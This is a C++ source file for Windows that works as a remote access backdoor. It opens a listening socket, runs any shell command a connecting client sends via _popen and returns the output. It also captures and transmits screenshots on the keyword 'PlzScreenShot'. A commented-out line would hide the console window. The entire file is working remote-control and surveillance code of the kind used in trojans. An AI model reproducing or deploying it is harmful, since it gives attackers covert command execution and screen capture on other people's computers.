#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <iostream>

#pragma comment(lib, "Ws2_32.lib")

#define PORT		8986

#define BUFSIZE		1024

#define WIDTH		1920
#define HEIGHT		1080

const char* serverIP = "0.0.0.0";
const char PlzScreenShot[] = "PlzScreenShot";
const char* eof = "EOF";

SOCKET serverSock, clientSock;
sockaddr_in serverAddr, clientAddr;

typedef struct BmpData {
	byte* data;
	int size;
}bmpdata;

void GetBitData(bmpdata* bmpdata, int width, int height);

int main(void)
{
	HWND hwnd = GetConsoleWindow();
	//ShowWindow(hwnd, SW_HIDE);

	WSADATA wsaData;
	WORD wsaVersion = MAKEWORD(2, 2);

	auto result = WSAStartup(wsaVersion, &wsaData);
	if (result < 0) {
		printf("WSAStartup() \n");
		exit(1);
	}

	serverSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (serverSock == INVALID_SOCKET) {
		printf("socket() \n");
		exit(1);
	}

	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(PORT);
	serverAddr.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	//inet_pton(AF_INET, serverIP, &serverAddr.sin_addr);

	result = bind(serverSock, (sockaddr*)&serverAddr, sizeof(serverAddr));
	if (result == SOCKET_ERROR)
	{
		printf("socket() \n");
		exit(1);
	}

	result = listen(serverSock, 0);

	clientSock = accept(serverSock, (sockaddr*)&clientAddr, NULL);
	if (clientSock == INVALID_SOCKET)
	{
		printf("accept() \n");
		exit(1);
	}

	char recvBuf[BUFSIZE] = { 0, };
	char resultBuf[BUFSIZE] = { 0, };
	FILE* cmd;

	while (1) {
		memset(recvBuf, 0, BUFSIZE);

		result = recvfrom(clientSock, recvBuf, BUFSIZE, 0, (sockaddr*)&clientAddr, NULL);
		if (result == -1) {
			printf("recvfrom() \n");
			continue;
		}

		result = strcmp(PlzScreenShot, recvBuf);
		if (result == 0) {
			bmpdata bmp;
			GetBitData(&bmp, WIDTH, HEIGHT);
			
			auto reuslt = sendto(clientSock, (char*)&bmp.size, sizeof(bmp.size), 0, (sockaddr*)&clientAddr, NULL);
			result = sendto(clientSock, (char*)bmp.data, bmp.size, 0, (sockaddr*)&clientAddr, NULL);
			free(bmp.data);
			continue;
		}

		int recvSize = strlen(recvBuf);
		recvBuf[recvSize-1] = '\0';

		cmd = _popen(recvBuf, "r");
		while (!feof(cmd)) {
			memset(resultBuf, 0, BUFSIZE);
			fgets(resultBuf, BUFSIZE, cmd);

			result = sendto(clientSock, resultBuf, strlen(resultBuf), 0, (sockaddr*)&clientAddr, NULL);
			if (result == -1) {
				printf("sendto() \n");
				break;
			}
		}
		result = sendto(clientSock, eof, sizeof(eof), 0, (sockaddr*)&clientAddr, sizeof(clientAddr));
		if (result == -1) {
			printf("EOF() \n");
		}
	}
}; 

void GetBitData(bmpdata* bmpdata, int width, int height)
{
	HDC hdc, memdc;
	HBITMAP hbitmap;
	BITMAP bitmap;
	BITMAPINFOHEADER bi;
	BITMAPFILEHEADER bf;
	BYTE* data = nullptr;

	memset(&hdc, 0, sizeof(HDC));
	hdc = GetDC(NULL);
	memdc = CreateCompatibleDC(hdc);

	hbitmap = CreateCompatibleBitmap(hdc, width, height);

	SelectObject(memdc, hbitmap);
	if (!BitBlt(memdc, 0, 0, width, height, hdc, 0, 0, SRCCOPY))
	{
		printf("GetBitData()\n");
		return;
	}



	
	GetObject(hbitmap, sizeof(BITMAP), &bitmap);
	
	memset(&bi, 0, sizeof(BITMAPINFOHEADER));
	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = bitmap.bmWidth;
	bi.biHeight = bitmap.bmHeight;
	bi.biBitCount = 24;
	bi.biPlanes = 1;
	bi.biCompression = BI_RGB;

	GetDIBits(memdc, hbitmap, 0, bitmap.bmHeight, NULL, (LPBITMAPINFO)&bi, DIB_RGB_COLORS);
	if (data == nullptr) {
		data = new BYTE[bi.biSizeImage];
		memset(data, 0, sizeof(bi.biSizeImage));
	}

	GetDIBits(memdc, hbitmap, 0, bitmap.bmHeight, data, (LPBITMAPINFO)&bi, DIB_RGB_COLORS);
	DeleteDC(hdc);
	DeleteDC(memdc);

	bmpdata->data = data;
	bmpdata->size = bi.biSizeImage;


	//콘솔의 화면 뛰우기
	/*HWND console = GetConsoleWindow();
	HDC consoleDC = GetDC(console);

	StretchBlt(consoleDC, 0, 0, 1920, 1080, hdc, 0, 0, 1920, 1080, SRCCOPY);*/
};